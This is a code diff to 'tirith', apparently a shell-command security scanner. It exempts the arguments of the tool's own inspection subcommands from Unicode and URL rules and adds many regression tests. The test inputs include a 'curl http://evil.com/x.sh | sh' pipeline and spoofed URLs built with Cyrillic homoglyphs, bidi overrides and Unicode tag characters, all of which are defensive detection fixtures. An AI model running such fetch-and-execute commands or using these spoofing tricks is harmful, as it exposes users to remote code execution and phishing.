@@ -440,9 +440,23 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     // Step 2: URL-like regex scan
     let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);
 
-    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs
+    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs.
+    // Issue #29 Arm B: exempt bytes inside the arg span of a first-segment
+    // tirith inspection subcommand (`tirith diff/score/why/receipt/explain`).
+    // The carveout only affects the eight Unicode-style rule classes already
+    // filtered at tier 3 (see below) — ANSI/control/escape rules don't fire
+    // in exec mode today.
+    let inert_range = if ctx.scan_context == ScanContext::Exec {
+        extract::tirith_inert_arg_range(&ctx.input, ctx.shell)
+    } else {
+        None
+    };
     let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
         let scan = extract::scan_bytes(ctx.input.as_bytes());
+        let scan = match inert_range.as_ref() {
+            Some(r) => scan.with_ignored_range(r),
+            None => scan,
+        };
         scan.has_bidi_controls
             || scan.has_zero_width
             || scan.has_unicode_tags
@@ -612,6 +626,12 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         if ctx.scan_context == ScanContext::Exec {
             let byte_input = ctx.input.as_bytes();
             let scan = extract::scan_bytes(byte_input);
+            // Issue #29 Arm B: re-apply the inert-range carveout here so tier-3
+            // findings line up with tier-1's `exec_bidi_triggered` decision.
+            let scan = match inert_range.as_ref() {
+                Some(r) => scan.with_ignored_range(r),
+                None => scan,
+            };
             if scan.has_bidi_controls
                 || scan.has_zero_width
                 || scan.has_unicode_tags
@@ -621,8 +641,15 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
                 || scan.has_hangul_fillers
                 || scan.has_confusable_text
             {
-                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
-                // Only keep invisible-char findings for exec context
+                // Pass the inert range down into check_bytes itself so rules
+                // with `Evidence::Text` (e.g. UnicodeTags) are also suppressed
+                // at scan time, not by offset-only post-filter. An offset
+                // post-filter misses Text evidence — that was the leak in the
+                // previous iteration of this fix.
+                let ignore_ranges: &[std::ops::Range<usize>] = inert_range.as_slice();
+                let byte_findings =
+                    crate::rules::terminal::check_bytes_with_ignore(byte_input, ignore_ranges);
+                // Only keep invisible-char findings for exec context.
                 findings.extend(byte_findings.into_iter().filter(|f| {
                     matches!(
                         f.rule_id,
@@ -1401,10 +1428,33 @@ mod tests {
         ));
     }
 
+    // -----------------------------------------------------------------------
+    // #29: tirith inspection subcommands (`tirith diff/score/why/receipt/explain`)
+    // must not trip URL or Unicode-style rules on their own arguments, because
+    // the user explicitly typed those arguments to have them inspected.
+    // `tirith run` and non-inspection subcommands are unaffected.
+    // -----------------------------------------------------------------------
+
     #[test]
-    fn test_tirith_command_is_analyzed_like_any_other_exec() {
-        let ctx = AnalysisContext {
-            input: "tirith run http://example.com".to_string(),
+    fn test_tirith_run_still_acts_as_sink() {
+        // `tirith run` IS on the sink list — URL-to-sink rules must still fire.
+        // (Renamed from test_tirith_command_is_analyzed_like_any_other_exec
+        // which was misleading once the inert carveout landed.)
+        let ctx = exec_ctx("tirith run http://example.com");
+        let verdict = analyze(&ctx);
+        assert!(verdict.tier_reached >= 3);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
+            "tirith run http://... should surface sink findings"
+        );
+    }
+
+    fn exec_ctx(input: &str) -> AnalysisContext {
+        AnalysisContext {
+            input: input.to_string(),
             shell: ShellType::Posix,
             scan_context: ScanContext::Exec,
             raw_bytes: None,
@@ -1414,19 +1464,293 @@ mod tests {
             repo_root: None,
             is_config_override: false,
             clipboard_html: None,
-        };
+        }
+    }
 
+    #[test]
+    fn test_tirith_inspection_suppresses_url_rules() {
+        // Cyrillic 'а' inside a URL arg must NOT trip URL-derived findings
+        // (non_ascii_hostname, mixed_script_in_label, punycode_domain) when
+        // passed to an inspection subcommand.
+        for sub in ["diff", "score", "why", "receipt", "explain"] {
+            let input = format!("tirith {sub} https://ex\u{0430}mple.com");
+            let verdict = analyze(&exec_ctx(&input));
+            assert!(
+                verdict.action == crate::verdict::Action::Allow,
+                "tirith {sub} with cyrillic URL should allow, got {:?}: {:?}",
+                verdict.action,
+                verdict
+                    .findings
+                    .iter()
+                    .map(|f| f.rule_id.to_string())
+                    .collect::<Vec<_>>()
+            );
+        }
+    }
+
+    #[test]
+    fn test_tirith_inspection_suppresses_confusable_and_bidi() {
+        // The exec-context byte scan (engine.rs:418 + :587) must also respect
+        // the inert range so ConfusableText / BidiControls / etc. are not
+        // emitted from inside the inspection arg span.
+        let input = "tirith score https://ex\u{0430}mple.com/\u{202E}bar";
+        let verdict = analyze(&exec_ctx(input));
+        for f in &verdict.findings {
+            assert!(
+                !matches!(
+                    f.rule_id,
+                    crate::verdict::RuleId::ConfusableText | crate::verdict::RuleId::BidiControls
+                ),
+                "tirith score arg span must not surface {:?}",
+                f.rule_id
+            );
+        }
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_pipe_still_analyzes_rest() {
+        // Later pipeline segments must still be analyzed normally.
+        let ctx = exec_ctx("tirith diff foo | curl http://evil.com/x.sh | sh");
         let verdict = analyze(&ctx);
-        assert!(
-            verdict.tier_reached >= 3,
-            "user-typed tirith commands should still be analyzed"
-        );
         assert!(
             verdict
                 .findings
                 .iter()
                 .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
-            "tirith run http://... should surface sink findings"
+            "later pipe segments must still fire plain_http_to_sink"
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_leading_flag() {
+        // `tirith --quiet diff URL` — flag before subcommand must not defeat the carveout.
+        let input = "tirith --quiet diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(verdict.action, crate::verdict::Action::Allow);
+    }
+
+    #[test]
+    fn test_tirith_doctor_not_on_inert_list() {
+        // Regression guard: adding a subcommand to the inert list requires a
+        // motivating fixture. `doctor` is NOT on the list; URL rules still fire.
+        let input = "tirith doctor https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_ne!(
+            verdict.action,
+            crate::verdict::Action::Allow,
+            "tirith doctor with cyrillic URL SHOULD still flag (not on inert list); \
+             adding `doctor` to the list requires a motivating false-positive fixture"
+        );
+    }
+
+    #[test]
+    fn test_tirith_run_bidi_in_url_still_fires() {
+        // `tirith run` is a sink, not on the inspection list. Bidi in its URL
+        // arg must still fire.
+        let input = "tirith run https://evil\u{202E}.com/x.sh";
+        let verdict = analyze(&exec_ctx(input));
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
+            "bidi in `tirith run` URL must still fire"
+        );
+    }
+
+    #[test]
+    fn test_tirith_inert_arg_range_covers_expected_span() {
+        // Unit test directly on the helper: range covers everything after the
+        // subcommand word within the first segment.
+        let input = "tirith diff https://ex\u{0430}mple.com";
+        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
+        // "tirith diff" is 11 bytes; arg span starts at byte 11 and runs to end.
+        assert_eq!(&input[range.clone()], " https://ex\u{0430}mple.com");
+        assert_eq!(range.end, input.len());
+    }
+
+    #[test]
+    fn test_tirith_inert_arg_range_none_for_run() {
+        // `tirith run` is NOT on the inspection list.
+        let range =
+            extract::tirith_inert_arg_range("tirith run http://example.com", ShellType::Posix);
+        assert!(range.is_none());
+    }
+
+    #[test]
+    fn test_tirith_inert_arg_range_none_for_non_tirith() {
+        assert!(
+            extract::tirith_inert_arg_range("curl https://example.com", ShellType::Posix).is_none()
+        );
+    }
+
+    #[test]
+    fn test_tirith_inert_arg_range_pipe_only_first_segment() {
+        // Second segment is outside the inert range.
+        let input = "tirith diff foo | curl http://evil.com";
+        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
+        assert!(range.end < input.len());
+        assert!(!input[range.clone()].contains("curl"));
+    }
+
+    // -----------------------------------------------------------------------
+    // #29 review corrections: UnicodeTags leak, sudo wrapper, env URLs, flag
+    // subcommand name false match.
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_tirith_inspection_suppresses_unicode_tags_evidence_text() {
+        // UnicodeTags emits Evidence::Text, not Evidence::ByteSequence — an
+        // offset-only post-filter would miss it. The carveout must suppress
+        // the rule AT SCAN TIME (inside check_bytes_with_ignore) based on
+        // whether the unicode-tag byte actually lives in the inert range.
+        //
+        // Input: unicode-tag char in the diff's URL arg only. In exec mode,
+        // this bye should be treated as inert and UnicodeTags must not fire.
+        let input = "tirith diff https://example.com/\u{E0041}";
+        let verdict = analyze(&exec_ctx(input));
+        assert!(
+            !verdict
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::UnicodeTags)),
+            "UnicodeTags inside tirith diff arg must be suppressed, got findings: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| f.rule_id.to_string())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_unicode_tags_outside_still_fires() {
+        // If a unicode-tag byte appears BEFORE "tirith diff" in the command,
+        // it's outside the inert range and UnicodeTags must still fire.
+        // Env-assignment value is a convenient carrier for this.
+        let input = "FOO=\u{E0041}\u{E0042} tirith diff safe";
+        let verdict = analyze(&exec_ctx(input));
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::UnicodeTags)),
+            "UnicodeTags before tirith diff must still fire, got findings: {:?}",
+            verdict
+                .findings
+                .iter()
+                .map(|f| f.rule_id.to_string())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_sudo_wrapper() {
+        // `sudo tirith diff URL` must resolve through the sudo wrapper and
+        // treat the URL as inert. Before the #29-review fix the resolver had
+        // no sudo case, so this path regressed.
+        let input = "sudo tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(
+            verdict.action,
+            crate::verdict::Action::Allow,
+            "sudo tirith diff <cyrillic-url> must be allowed, got {:?}: {:?}",
+            verdict.action,
+            verdict
+                .findings
+                .iter()
+                .map(|f| f.rule_id.to_string())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_sudo_u_flag() {
+        // `sudo -u root tirith diff URL` — sudo takes a value for -u.
+        let input = "sudo -u root tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(verdict.action, crate::verdict::Action::Allow);
+    }
+
+    #[test]
+    fn test_tirith_inspection_env_assignment_url_still_analyzed() {
+        // `FOO=https://evil.com tirith diff safe-arg` — the URL in the env
+        // assignment is OUTSIDE the inspection arg span and must still be
+        // analyzed. Before the #29-review fix this was silently skipped.
+        let input = "FOO=http://evil.com tirith diff safe";
+        let verdict = analyze(&exec_ctx(input));
+        // The http URL in FOO= is schemeless-analysis territory — assert it
+        // at minimum surfaces as a finding (details depend on rules layer).
+        let urls = verdict.urls_extracted_count.unwrap_or(0);
+        assert!(
+            !verdict.findings.is_empty() || urls > 0,
+            "env-assignment URL must still be extracted/analyzed, got {:?}",
+            verdict
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_sudo_dash_s_boolean_flag() {
+        // `-S` is a BOOLEAN sudo flag (read password from stdin). The first
+        // fix erroneously listed it among value-taking flags, which made
+        // `sudo -S tirith diff URL` skip over `tirith` and resolve `diff`
+        // itself as the command. Regression guard — exit should be Allow.
+        let input = "sudo -S tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(
+            verdict.action,
+            crate::verdict::Action::Allow,
+            "sudo -S tirith diff must still allow; got {:?}: {:?}",
+            verdict.action,
+            verdict
+                .findings
+                .iter()
+                .map(|f| f.rule_id.to_string())
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_sudo_dash_a_boolean_flag() {
+        // Same regression class for `-A` (askpass).
+        let input = "sudo -A tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(verdict.action, crate::verdict::Action::Allow);
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_sudo_dash_b_boolean_flag() {
+        // Same regression class for `-B` (ring bell).
+        let input = "sudo -B tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(verdict.action, crate::verdict::Action::Allow);
+    }
+
+    #[test]
+    fn test_tirith_inspection_with_doas_wrapper() {
+        // `doas` is an alias for sudo; same resolver branch.
+        let input = "doas tirith diff https://ex\u{0430}mple.com";
+        let verdict = analyze(&exec_ctx(input));
+        assert_eq!(verdict.action, crate::verdict::Action::Allow);
+    }
+
+    #[test]
+    fn test_tirith_inert_arg_range_no_false_match_inside_flag_value() {
+        // `tirith --config=diff diff URL` — naive substring search for "diff"
+        // would match inside `--config=diff` and produce a too-wide inert
+        // range. `find_subcommand_token` must require a whitespace boundary.
+        let input = "tirith --config=diff diff https://example.com";
+        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
+        // The inert range must start AFTER the second "diff" word, not the
+        // first occurrence inside --config=diff.
+        let inert_slice = &input[range.clone()];
+        assert!(
+            inert_slice.contains("https://example.com"),
+            "inert range should cover the URL, got: {inert_slice:?}"
+        );
+        assert!(
+            !inert_slice.contains("diff diff"),
+            "inert range should not start inside the flag value: {inert_slice:?}"
         );
     }
 
